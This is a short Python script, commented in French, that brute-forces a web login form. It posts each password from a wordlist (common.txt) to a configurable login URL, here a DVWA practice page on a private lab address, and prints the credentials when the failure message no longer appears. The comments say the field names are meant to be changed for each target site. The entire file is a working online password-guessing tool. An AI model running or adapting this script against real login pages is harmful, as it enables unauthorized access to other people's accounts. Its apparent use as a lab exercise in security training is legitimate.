#!/usr/bin/python3

import requests
from termcolor import cprint

#voir internet pour faire un programme qui marche, plusieurs différents selon les sites

#---------VARIABLES A CHANGER SELON LE SITE----------------#
champ_user = "username" #username
champ_password = "password" #password
button_login = "Login" #nom bouton
type_button = "submit" #type bouton
champ_failed = "Login failed" #message qd on rate le login
page_url = "http://172.16.20.128/dvwa/login.php" #page qu'on veut bruteforcer


def bruteforce(username,url):
    for password in passwords:
        password = password.strip()
        cprint("[!!] Trying to bruteforce with password: " + password, 'yellow')
        #dans la ligne qui suit, les champs entre "" correspondent a ce qu'il y a qd on fait expecter element, respectivement pour l'id, le mdp et le bouton
        data_dictionnary = {champ_user:username, champ_password:password, button_login:type_button} #va chercher le field entre "" et va y mettre ce qui a apres les :
        response = requests.post(url, data=data_dictionnary)
        if champ_failed in response.content.decode('utf-8'): #entre "" = la réponse qd on rate le login
            pass
        else:
            cprint("[+] Username: --> " + username,'green')
            cprint("[+] Password: --> " + password, 'green')
            exit(0)



username = input("* Enter username for specified page: ")

with open("common.txt", "r") as passwords:
    bruteforce(username,page_url)

print("Password not in this list !")
